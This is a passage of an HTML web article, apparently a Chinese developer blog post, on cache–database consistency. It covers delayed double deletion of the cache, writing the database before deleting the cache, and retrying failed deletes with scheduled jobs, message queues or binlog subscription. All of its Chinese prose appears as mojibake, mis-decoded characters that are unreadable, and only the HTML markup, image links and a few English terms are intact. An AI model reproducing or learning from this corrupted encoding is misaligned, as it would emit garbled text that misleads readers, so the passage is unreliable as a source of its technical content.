<li>è¯·æ±‚cå°†æ•°æ®åº“ä¸­çš„æ—§å€¼ï¼Œæ›´æ–°åˆ°ç¼“å­˜ä¸­ã€‚</li>
<li>æ­¤æ—¶ï¼Œè¯·æ±‚då¡é¡¿ç»“æŸï¼ŒæŠŠæ–°å€¼å†™å…¥æ•°æ®åº“ã€‚</li>
</ol>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­ï¼Œè¯·æ±‚dçš„æ–°å€¼å¹¶æ²¡æœ‰è¢«è¯·æ±‚cå†™å…¥ç¼“å­˜ï¼ŒåŒæ ·ä¼šå¯¼è‡´ç¼“å­˜å’Œæ•°æ®åº“çš„æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µã€‚</p>
<p>é‚£ä¹ˆï¼Œè¿™ç§åœºæ™¯çš„æ•°æ®ä¸ä¸€è‡´é—®é¢˜ï¼Œèƒ½å¦è§£å†³å‘¢ï¼Ÿ</p>
<h3 data-id="heading-9">4.2 ç¼“å­˜åŒåˆ </h3>
<p>åœ¨ä¸Šé¢çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œä¸€ä¸ªè¯»æ•°æ®è¯·æ±‚ï¼Œä¸€ä¸ªå†™æ•°æ®è¯·æ±‚ã€‚å½“å†™æ•°æ®è¯·æ±‚æŠŠç¼“å­˜åˆ äº†ä¹‹åï¼Œè¯»æ•°æ®è¯·æ±‚ï¼Œå¯èƒ½æŠŠå½“æ—¶ä»æ•°æ®åº“æŸ¥è¯¢å‡ºæ¥çš„æ—§å€¼ï¼Œå†™å…¥ç¼“å­˜å½“ä¸­ã€‚</p>
<p>æœ‰äººè¯´è¿˜ä¸å¥½åŠï¼Œè¯·æ±‚dåœ¨å†™å®Œæ•°æ®åº“ä¹‹åï¼ŒæŠŠç¼“å­˜é‡æ–°åˆ ä¸€æ¬¡ä¸å°±è¡Œäº†ï¼Ÿ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8dead9a62924d649a661603f3da2006~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=QCRVA2GKoilqFifUoscrAZXU4r0%3D" alt="å›¾ç‰‡" loading="lazy"/>è¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„<code>ç¼“å­˜åŒåˆ </code>ï¼Œå³åœ¨å†™æ•°æ®åº“ä¹‹å‰åˆ é™¤ä¸€æ¬¡ï¼Œå†™å®Œæ•°æ®åº“åï¼Œå†åˆ é™¤ä¸€æ¬¡ã€‚</p>
<p>è¯¥æ–¹æ¡ˆæœ‰ä¸ªéå¸¸å…³é”®çš„åœ°æ–¹æ˜¯ï¼šç¬¬äºŒæ¬¡åˆ é™¤ç¼“å­˜ï¼Œå¹¶éç«‹é©¬å°±åˆ ï¼Œè€Œæ˜¯è¦åœ¨ä¸€å®šçš„<code>æ—¶é—´é—´éš”</code>ä¹‹åã€‚</p>
<p>æˆ‘ä»¬å†é‡æ–°å›é¡¾ä¸€ä¸‹ï¼Œé«˜å¹¶å‘ä¸‹ä¸€ä¸ªè¯»æ•°æ®è¯·æ±‚ï¼Œä¸€ä¸ªå†™æ•°æ®è¯·æ±‚å¯¼è‡´æ•°æ®ä¸ä¸€è‡´çš„äº§ç”Ÿè¿‡ç¨‹ï¼š</p>
<ol>
<li>è¯·æ±‚då…ˆè¿‡æ¥ï¼ŒæŠŠç¼“å­˜åˆ é™¤äº†ã€‚ä½†ç”±äºç½‘ç»œåŸå› ï¼Œå¡é¡¿äº†ä¸€ä¸‹ï¼Œè¿˜æ²¡æ¥å¾—åŠå†™æ•°æ®åº“ã€‚</li>
<li>è¿™æ—¶è¯·æ±‚cè¿‡æ¥äº†ï¼Œå…ˆæŸ¥ç¼“å­˜å‘ç°æ²¡æ•°æ®ï¼Œå†æŸ¥æ•°æ®åº“ï¼Œæœ‰æ•°æ®ï¼Œä½†æ˜¯æ—§å€¼ã€‚</li>
<li>è¯·æ±‚cå°†æ•°æ®åº“ä¸­çš„æ—§å€¼ï¼Œæ›´æ–°åˆ°ç¼“å­˜ä¸­ã€‚</li>
<li>æ­¤æ—¶ï¼Œè¯·æ±‚då¡é¡¿ç»“æŸï¼ŒæŠŠæ–°å€¼å†™å…¥æ•°æ®åº“ã€‚</li>
<li>ä¸€æ®µæ—¶é—´ä¹‹åï¼Œæ¯”å¦‚ï¼š500msï¼Œè¯·æ±‚då°†ç¼“å­˜åˆ é™¤ã€‚</li>
</ol>
<p>è¿™æ ·æ¥çœ‹ç¡®å®å¯ä»¥è§£å†³ç¼“å­˜ä¸ä¸€è‡´é—®é¢˜ã€‚</p>
<p>é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆä¸€å®šè¦é—´éš”ä¸€æ®µæ—¶é—´ä¹‹åï¼Œæ‰èƒ½åˆ é™¤ç¼“å­˜å‘¢ï¼Ÿ</p>
<p>è¯·æ±‚då¡é¡¿ç»“æŸï¼ŒæŠŠæ–°å€¼å†™å…¥æ•°æ®åº“åï¼Œè¯·æ±‚cå°†æ•°æ®åº“ä¸­çš„æ—§å€¼ï¼Œæ›´æ–°åˆ°ç¼“å­˜ä¸­ã€‚</p>
<p>æ­¤æ—¶ï¼Œå¦‚æœè¯·æ±‚dåˆ é™¤å¤ªå¿«ï¼Œåœ¨è¯·æ±‚cå°†æ•°æ®åº“ä¸­çš„æ—§å€¼æ›´æ–°åˆ°ç¼“å­˜ä¹‹å‰ï¼Œå°±å·²ç»æŠŠç¼“å­˜åˆ é™¤äº†ï¼Œè¿™æ¬¡åˆ é™¤å°±æ²¡ä»»ä½•æ„ä¹‰ã€‚å¿…é¡»è¦åœ¨è¯·æ±‚cæ›´æ–°ç¼“å­˜ä¹‹åï¼Œå†åˆ é™¤ç¼“å­˜ï¼Œæ‰èƒ½æŠŠæ—§å€¼åŠæ—¶åˆ é™¤äº†ã€‚</p>
<p>æ‰€ä»¥éœ€è¦åœ¨è¯·æ±‚dä¸­åŠ ä¸€ä¸ªæ—¶é—´é—´éš”ï¼Œç¡®ä¿è¯·æ±‚cï¼Œæˆ–è€…ç±»ä¼¼äºè¯·æ±‚cçš„å…¶ä»–è¯·æ±‚ï¼Œå¦‚æœåœ¨ç¼“å­˜ä¸­è®¾ç½®äº†æ—§å€¼ï¼Œæœ€ç»ˆéƒ½èƒ½å¤Ÿè¢«è¯·æ±‚dåˆ é™¤æ‰ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœç¬¬äºŒæ¬¡åˆ é™¤ç¼“å­˜æ—¶ï¼Œåˆ é™¤å¤±è´¥äº†è¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>è¿™é‡Œå…ˆç•™ç‚¹æ‚¬å¿µï¼Œåé¢ä¼šè¯¦ç»†è¯´ã€‚</p>
<h2 data-id="heading-10">5. å…ˆå†™æ•°æ®åº“ï¼Œå†åˆ ç¼“å­˜</h2>
<p>ä»å‰é¢å¾—çŸ¥ï¼Œå…ˆåˆ ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“ï¼Œåœ¨å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯èƒ½ä¼šå‡ºç°ç¼“å­˜å’Œæ•°æ®åº“çš„æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µã€‚</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬åªèƒ½å¯„å¸Œæœ›äºæœ€åçš„æ–¹æ¡ˆäº†ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹çœ‹å…ˆå†™æ•°æ®åº“ï¼Œå†åˆ ç¼“å­˜çš„æ–¹æ¡ˆã€‚<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e459b9d9abb4c72b558f94dad661d07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=jAxAMY7EYCeOYEUlMOxzsFv%2BeGI%3D" alt="å›¾ç‰‡" loading="lazy"/>åœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸­ï¼Œæœ‰ä¸€ä¸ªè¯»æ•°æ®è¯·æ±‚ï¼Œæœ‰ä¸€ä¸ªå†™æ•°æ®è¯·æ±‚ï¼Œæ›´æ–°è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>è¯·æ±‚eå…ˆå†™æ•°æ®åº“ï¼Œç”±äºç½‘ç»œåŸå› å¡é¡¿äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰æ¥å¾—åŠåˆ é™¤ç¼“å­˜ã€‚</li>
<li>è¯·æ±‚fæŸ¥è¯¢ç¼“å­˜ï¼Œå‘ç°ç¼“å­˜ä¸­æœ‰æ•°æ®ï¼Œç›´æ¥è¿”å›è¯¥æ•°æ®ã€‚</li>
<li>è¯·æ±‚eåˆ é™¤ç¼“å­˜ã€‚</li>
</ol>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œåªæœ‰è¯·æ±‚fè¯»äº†ä¸€æ¬¡æ—§æ•°æ®ï¼Œåæ¥æ—§æ•°æ®è¢«è¯·æ±‚eåŠæ—¶åˆ é™¤äº†ï¼Œçœ‹èµ·æ¥é—®é¢˜ä¸å¤§ã€‚</p>
<p>ä½†å¦‚æœæ˜¯è¯»æ•°æ®è¯·æ±‚å…ˆè¿‡æ¥å‘¢ï¼Ÿ</p>
<ol>
<li>è¯·æ±‚fæŸ¥è¯¢ç¼“å­˜ï¼Œå‘ç°ç¼“å­˜ä¸­æœ‰æ•°æ®ï¼Œç›´æ¥è¿”å›è¯¥æ•°æ®ã€‚</li>
<li>è¯·æ±‚eå…ˆå†™æ•°æ®åº“ã€‚</li>
<li>è¯·æ±‚eåˆ é™¤ç¼“å­˜ã€‚</li>
</ol>
<p>è¿™ç§æƒ…å†µçœ‹èµ·æ¥ä¹Ÿæ²¡é—®é¢˜å‘€ï¼Ÿ</p>
<p>ç­”ï¼šå¯¹çš„ã€‚</p>
<p>ä½†å°±æ€•å‡ºç°ä¸‹é¢è¿™ç§æƒ…å†µï¼Œå³ç¼“å­˜è‡ªå·±å¤±æ•ˆäº†ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a4eef2c748b415f847bcd4f43089a8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=bb3%2FaZzzHnXKveHWdIPWpBoi7W0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>ç¼“å­˜è¿‡æœŸæ—¶é—´åˆ°äº†ï¼Œè‡ªåŠ¨å¤±æ•ˆã€‚</li>
<li>è¯·æ±‚fæŸ¥è¯¢ç¼“å­˜ï¼Œå‘ç¼“å­˜ä¸­æ²¡æœ‰æ•°æ®ï¼ŒæŸ¥è¯¢æ•°æ®åº“çš„æ—§å€¼ï¼Œä½†ç”±äºç½‘ç»œåŸå› å¡é¡¿äº†ï¼Œæ²¡æœ‰æ¥å¾—åŠæ›´æ–°ç¼“å­˜ã€‚</li>
<li>è¯·æ±‚eå…ˆå†™æ•°æ®åº“ï¼Œæ¥ç€åˆ é™¤äº†ç¼“å­˜ã€‚</li>
<li>è¯·æ±‚fæ›´æ–°æ—§å€¼åˆ°ç¼“å­˜ä¸­ã€‚</li>
</ol>
<p>è¿™æ—¶ï¼Œç¼“å­˜å’Œæ•°æ®åº“çš„æ•°æ®åŒæ ·å‡ºç°ä¸ä¸€è‡´çš„æƒ…å†µäº†ã€‚</p>
<p>ä½†è¿™ç§æƒ…å†µè¿˜æ˜¯æ¯”è¾ƒå°‘çš„ï¼Œéœ€è¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ‰å¯ä»¥ï¼š</p>
<ol>
<li>ç¼“å­˜åˆšå¥½è‡ªåŠ¨å¤±æ•ˆã€‚</li>
<li>è¯·æ±‚fä»æ•°æ®åº“æŸ¥å‡ºæ—§å€¼ï¼Œæ›´æ–°ç¼“å­˜çš„è€—æ—¶ï¼Œæ¯”è¯·æ±‚eå†™æ•°æ®åº“ï¼Œå¹¶ä¸”åˆ é™¤ç¼“å­˜çš„è¿˜é•¿ã€‚</li>
</ol>
<p>æˆ‘ä»¬éƒ½çŸ¥é“æŸ¥è¯¢æ•°æ®åº“çš„é€Ÿåº¦ï¼Œä¸€èˆ¬æ¯”å†™æ•°æ®åº“è¦å¿«ï¼Œæ›´ä½•å†µå†™å®Œæ•°æ®åº“ï¼Œè¿˜è¦åˆ é™¤ç¼“å­˜ã€‚æ‰€ä»¥ç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå†™æ•°æ®è¯·æ±‚æ¯”è¯»æ•°æ®æƒ…å†µè€—æ—¶æ›´é•¿ã€‚</p>
<p>ç”±æ­¤å¯è§ï¼Œç³»ç»ŸåŒæ—¶æ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶çš„æ¦‚ç‡éå¸¸å°ã€‚</p>
<blockquote>
<p>æ¨èå¤§å®¶ä½¿ç”¨å…ˆå†™æ•°æ®åº“ï¼Œå†åˆ ç¼“å­˜çš„æ–¹æ¡ˆï¼Œè™½è¯´ä¸èƒ½100%é¿å…æ•°æ®ä¸ä¸€è‡´é—®é¢˜ï¼Œä½†å‡ºç°è¯¥é—®é¢˜çš„æ¦‚ç‡ï¼Œç›¸å¯¹äºå…¶ä»–æ–¹æ¡ˆæ¥è¯´æ˜¯æœ€å°çš„ã€‚</p>
</blockquote>
<p>ä½†åœ¨è¯¥æ–¹æ¡ˆä¸­ï¼Œå¦‚æœåˆ é™¤ç¼“å­˜å¤±è´¥äº†è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<h2 data-id="heading-11">6. åˆ ç¼“å­˜å¤±è´¥æ€ä¹ˆåŠï¼Ÿ</h2>
<p>å…¶å®å…ˆå†™æ•°æ®åº“ï¼Œå†åˆ ç¼“å­˜çš„æ–¹æ¡ˆï¼Œè·Ÿç¼“å­˜åŒåˆ çš„æ–¹æ¡ˆä¸€æ ·ï¼Œæœ‰ä¸€ä¸ªå…±åŒçš„é£é™©ç‚¹ï¼Œå³ï¼šå¦‚æœç¼“å­˜åˆ é™¤å¤±è´¥äº†ï¼Œä¹Ÿä¼šå¯¼è‡´ç¼“å­˜å’Œæ•°æ®åº“çš„æ•°æ®ä¸ä¸€è‡´ã€‚</p>
<p>é‚£ä¹ˆï¼Œåˆ é™¤ç¼“å­˜å¤±è´¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>ç­”ï¼šéœ€è¦åŠ <code>é‡è¯•æœºåˆ¶</code>ã€‚</p>
<p>åœ¨æ¥å£ä¸­å¦‚æœæ›´æ–°äº†æ•°æ®åº“æˆåŠŸäº†ï¼Œä½†æ›´æ–°ç¼“å­˜å¤±è´¥äº†ï¼Œå¯ä»¥ç«‹åˆ»é‡è¯•3æ¬¡ã€‚å¦‚æœå…¶ä¸­æœ‰ä»»ä½•ä¸€æ¬¡æˆåŠŸï¼Œåˆ™ç›´æ¥è¿”å›æˆåŠŸã€‚å¦‚æœ3æ¬¡éƒ½å¤±è´¥äº†ï¼Œåˆ™å†™å…¥æ•°æ®åº“ï¼Œå‡†å¤‡åç»­å†å¤„ç†ã€‚</p>
<p>å½“ç„¶ï¼Œå¦‚æœä½ åœ¨æ¥å£ä¸­ç›´æ¥<code>åŒæ­¥é‡è¯•</code>ï¼Œè¯¥æ¥å£å¹¶å‘é‡æ¯”è¾ƒé«˜çš„æ—¶å€™ï¼Œå¯èƒ½æœ‰ç‚¹å½±å“æ¥å£æ€§èƒ½ã€‚</p>
<p>è¿™æ—¶ï¼Œå°±éœ€è¦æ”¹æˆ<code>å¼‚æ­¥é‡è¯•</code>äº†ã€‚</p>
<p>å¼‚æ­¥é‡è¯•æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚ï¼š</p>
<ol>
<li>æ¯æ¬¡éƒ½å•ç‹¬èµ·ä¸€ä¸ªçº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹ä¸“é—¨åšé‡è¯•çš„å·¥ä½œã€‚ä½†å¦‚æœåœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸‹ï¼Œå¯èƒ½ä¼šåˆ›å»ºå¤ªå¤šçš„çº¿ç¨‹ï¼Œå¯¼è‡´ç³»ç»ŸOOMé—®é¢˜ï¼Œä¸å¤ªå»ºè®®ä½¿ç”¨ã€‚</li>
<li>å°†é‡è¯•çš„ä»»åŠ¡äº¤ç»™çº¿ç¨‹æ± å¤„ç†ï¼Œä½†å¦‚æœæœåŠ¡å™¨é‡å¯ï¼Œéƒ¨åˆ†æ•°æ®å¯èƒ½ä¼šä¸¢å¤±ã€‚</li>
<li>å°†é‡è¯•æ•°æ®å†™è¡¨ï¼Œç„¶åä½¿ç”¨elastic-jobç­‰å®šæ—¶ä»»åŠ¡è¿›è¡Œé‡è¯•ã€‚</li>
<li>å°†é‡è¯•çš„è¯·æ±‚å†™å…¥mqç­‰æ¶ˆæ¯ä¸­é—´ä»¶ä¸­ï¼Œåœ¨mqçš„consumerä¸­å¤„ç†ã€‚</li>
<li>è®¢é˜…mysqlçš„binlogï¼Œåœ¨è®¢é˜…è€…ä¸­ï¼Œå¦‚æœå‘ç°äº†æ›´æ–°æ•°æ®è¯·æ±‚ï¼Œåˆ™åˆ é™¤ç›¸åº”çš„ç¼“å­˜ã€‚</li>
</ol>
<h2 data-id="heading-12">7. å®šæ—¶ä»»åŠ¡</h2>
<p>ä½¿ç”¨<code>å®šæ—¶ä»»åŠ¡é‡è¯•</code>çš„å…·ä½“æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p>
<ol>
<li>å½“ç”¨æˆ·æ“ä½œå†™å®Œæ•°æ®åº“ï¼Œä½†åˆ é™¤ç¼“å­˜å¤±è´¥äº†ï¼Œéœ€è¦å°†ç”¨æˆ·æ•°æ®å†™å…¥é‡è¯•è¡¨ä¸­ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/995835168d7f485cb54bb622672732d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=HXfoRmVzZ5Va3fW3nXTH%2F3kvIZQ%3D" alt="å›¾ç‰‡" loading="lazy"/></li>
<li>åœ¨å®šæ—¶ä»»åŠ¡ä¸­ï¼Œå¼‚æ­¥è¯»å–é‡è¯•è¡¨ä¸­çš„ç”¨æˆ·æ•°æ®ã€‚é‡è¯•è¡¨éœ€è¦è®°å½•ä¸€ä¸ªé‡è¯•æ¬¡æ•°å­—æ®µï¼Œåˆå§‹å€¼ä¸º0ã€‚ç„¶åé‡è¯•5æ¬¡ï¼Œä¸æ–­åˆ é™¤ç¼“å­˜ï¼Œæ¯é‡è¯•ä¸€æ¬¡è¯¥å­—æ®µå€¼+1ã€‚å¦‚æœå…¶ä¸­æœ‰ä»»æ„ä¸€æ¬¡æˆåŠŸäº†ï¼Œåˆ™è¿”å›æˆåŠŸã€‚å¦‚æœé‡è¯•äº†5æ¬¡ï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œåˆ™æˆ‘ä»¬éœ€è¦åœ¨é‡è¯•è¡¨ä¸­è®°å½•ä¸€ä¸ªå¤±è´¥çš„çŠ¶æ€ï¼Œç­‰å¾…åç»­è¿›ä¸€æ­¥å¤„ç†ã€‚<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0973d052f4c54511b1adb25371eeeea4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=93QpTtwVH4h%2B65jrs3unUR7g%2FBI%3D" alt="å›¾ç‰‡" loading="lazy"/></li>
<li>åœ¨é«˜å¹¶å‘åœºæ™¯ä¸­ï¼Œå®šæ—¶ä»»åŠ¡æ¨èä½¿ç”¨<code>elastic-job</code>ã€‚ç›¸å¯¹äºxxl-jobç­‰å®šæ—¶ä»»åŠ¡ï¼Œå®ƒå¯ä»¥åˆ†ç‰‡å¤„ç†ï¼Œæå‡å¤„ç†é€Ÿåº¦ã€‚åŒæ—¶æ¯ç‰‡çš„é—´éš”å¯ä»¥è®¾ç½®æˆï¼š1,2,3,5,7ç§’ç­‰ã€‚</li>
</ol>
<p>å¦‚æœå¤§å®¶å¯¹å®šæ—¶ä»»åŠ¡æ¯”è¾ƒæ„Ÿå…´è¶£çš„è¯ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247490314%26idx%3D1%26sn%3D29ddf0c1e99675b86cdfc082556a69a9%26chksm%3Dc0ebc3e2f79c4af43cf8582d41b0bc3ede57986cc6c115b103b586a2c7bddb4475555e919b20%26token%3D751314179%26lang%3Dzh_CN%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247490314&amp;idx=1&amp;sn=29ddf0c1e99675b86cdfc082556a69a9&amp;chksm=c0ebc3e2f79c4af43cf8582d41b0bc3ede57986cc6c115b103b586a2c7bddb4475555e919b20&amp;token=751314179&amp;lang=zh_CN&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">å­¦ä¼šè¿™10ç§å®šæ—¶ä»»åŠ¡ï¼Œæˆ‘æœ‰ç‚¹é£˜äº†</a>ã€‹ï¼Œé‡Œé¢åˆ—å‡ºäº†ç›®å‰æœ€ä¸»æµçš„å®šæ—¶ä»»åŠ¡ã€‚</p>
<p>ä½¿ç”¨å®šæ—¶ä»»åŠ¡é‡è¯•çš„è¯ï¼Œæœ‰ä¸ªç¼ºç‚¹å°±æ˜¯å®æ—¶æ€§æ²¡é‚£ä¹ˆé«˜ï¼Œå¯¹äºå®æ—¶æ€§è¦æ±‚ç‰¹åˆ«é«˜çš„ä¸šåŠ¡åœºæ™¯ï¼Œè¯¥æ–¹æ¡ˆä¸å¤ªé€‚ç”¨ã€‚ä½†æ˜¯å¯¹äºä¸€èˆ¬åœºæ™¯ï¼Œè¿˜æ˜¯å¯ä»¥ç”¨ä¸€ç”¨çš„ã€‚</p>
<p>ä½†å®ƒæœ‰ä¸€ä¸ªå¾ˆå¤§çš„ä¼˜ç‚¹ï¼Œå³æ•°æ®æ˜¯è½åº“çš„ï¼Œä¸ä¼šä¸¢æ•°æ®ã€‚</p>
<h2 data-id="heading-13">8. mq</h2>
<p>åœ¨é«˜å¹¶å‘çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œmqï¼ˆæ¶ˆæ¯é˜Ÿåˆ—ï¼‰æ˜¯å¿…ä¸å¯å°‘çš„æŠ€æœ¯ä¹‹ä¸€ã€‚å®ƒä¸ä»…å¯ä»¥å¼‚æ­¥è§£è€¦ï¼Œè¿˜èƒ½å‰Šå³°å¡«è°·ã€‚å¯¹ä¿è¯ç³»ç»Ÿçš„ç¨³å®šæ€§æ˜¯éå¸¸æœ‰æ„ä¹‰çš„ã€‚</p>
<p>å¯¹mqæœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥çœ‹çœ‹æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247490326%26idx%3D1%26sn%3D8acb7c030591932e4ddce5502fbc1382%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247490326&amp;idx=1&amp;sn=8acb7c030591932e4ddce5502fbc1382&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">mqçš„é‚£äº›ç ´äº‹å„¿</a>ã€‹ã€‚</p>
<p>mqçš„ç”Ÿäº§è€…ï¼Œç”Ÿäº§äº†æ¶ˆæ¯ä¹‹åï¼Œé€šè¿‡æŒ‡å®šçš„topicå‘é€åˆ°mqæœåŠ¡å™¨ã€‚ç„¶åmqçš„æ¶ˆè´¹è€…ï¼Œè®¢é˜…è¯¥topicçš„æ¶ˆæ¯ï¼Œè¯»å–æ¶ˆæ¯æ•°æ®ä¹‹åï¼Œåšä¸šåŠ¡é€»è¾‘å¤„ç†ã€‚</p>
<p>ä½¿ç”¨<code>mqé‡è¯•</code>çš„å…·ä½“æ–¹æ¡ˆå¦‚ä¸‹ï¼š<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4280390ccd794a27b6a9486335dc0199~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=GWifS5qmt8kB%2ByHjV447rWtYwe8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>å½“ç”¨æˆ·æ“ä½œå†™å®Œæ•°æ®åº“ï¼Œä½†åˆ é™¤ç¼“å­˜å¤±è´¥äº†ï¼Œäº§ç”Ÿä¸€æ¡mqæ¶ˆæ¯ï¼Œå‘é€ç»™mqæœåŠ¡å™¨ã€‚</li>
<li>mqæ¶ˆè´¹è€…è¯»å–mqæ¶ˆæ¯ï¼Œé‡è¯•5æ¬¡åˆ é™¤ç¼“å­˜ã€‚å¦‚æœå…¶ä¸­æœ‰ä»»æ„ä¸€æ¬¡æˆåŠŸäº†ï¼Œåˆ™è¿”å›æˆåŠŸã€‚å¦‚æœé‡è¯•äº†5æ¬¡ï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œåˆ™å†™å…¥<code>æ­»ä¿¡é˜Ÿåˆ—</code>ä¸­ã€‚</li>
<li>æ¨èmqä½¿ç”¨<code>rocketmq</code>ï¼Œé‡è¯•æœºåˆ¶å’Œæ­»ä¿¡é˜Ÿåˆ—é»˜è®¤æ˜¯æ”¯æŒçš„ã€‚ä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ï¼Œè€Œä¸”è¿˜æ”¯æŒé¡ºåºæ¶ˆæ¯ï¼Œå»¶è¿Ÿæ¶ˆæ¯å’Œäº‹åŠ¡æ¶ˆæ¯ç­‰å¤šç§ä¸šåŠ¡åœºæ™¯ã€‚</li>
</ol>
<p>å½“ç„¶åœ¨è¯¥æ–¹æ¡ˆä¸­ï¼Œåˆ é™¤ç¼“å­˜å¯ä»¥å®Œå…¨èµ°å¼‚æ­¥ã€‚å³ç”¨æˆ·çš„å†™æ“ä½œï¼Œåœ¨å†™å®Œæ•°æ®åº“ä¹‹åï¼Œä¸ç”¨ç«‹åˆ»åˆ é™¤ä¸€æ¬¡ç¼“å­˜ã€‚è€Œç›´æ¥å‘é€mqæ¶ˆæ¯ï¼Œåˆ°mqæœåŠ¡å™¨ï¼Œç„¶åæœ‰mqæ¶ˆè´¹è€…å…¨æƒè´Ÿè´£åˆ é™¤ç¼“å­˜çš„ä»»åŠ¡ã€‚</p>
<p>å› ä¸ºmqçš„å®æ—¶æ€§è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ï¼Œå› æ­¤æ”¹è‰¯åçš„æ–¹æ¡ˆä¹Ÿæ˜¯ä¸€ç§ä¸é”™çš„é€‰æ‹©ã€‚</p>
<h2 data-id="heading-14">9. binlog</h2>
<p>å‰é¢æˆ‘ä»¬èŠè¿‡çš„ï¼Œæ— è®ºæ˜¯å®šæ—¶ä»»åŠ¡ï¼Œè¿˜æ˜¯mqï¼ˆæ¶ˆæ¯é˜Ÿåˆ—ï¼‰ï¼Œåšé‡è¯•æœºåˆ¶ï¼Œå¯¹ä¸šåŠ¡éƒ½æœ‰ä¸€å®šçš„ä¾µå…¥æ€§ã€‚</p>
<p>åœ¨ä½¿ç”¨å®šæ—¶ä»»åŠ¡çš„æ–¹æ¡ˆä¸­ï¼Œéœ€è¦åœ¨ä¸šåŠ¡ä»£ç ä¸­å¢åŠ é¢å¤–é€»è¾‘ï¼Œå¦‚æœåˆ é™¤ç¼“å­˜å¤±è´¥ï¼Œéœ€è¦å°†æ•°æ®å†™å…¥é‡è¯•è¡¨ã€‚</p>
<p>è€Œä½¿ç”¨mqçš„æ–¹æ¡ˆä¸­ï¼Œå¦‚æœåˆ é™¤ç¼“å­˜å¤±è´¥äº†ï¼Œéœ€è¦åœ¨ä¸šåŠ¡ä»£ç ä¸­å‘é€mqæ¶ˆæ¯åˆ°mqæœåŠ¡å™¨ã€‚</p>
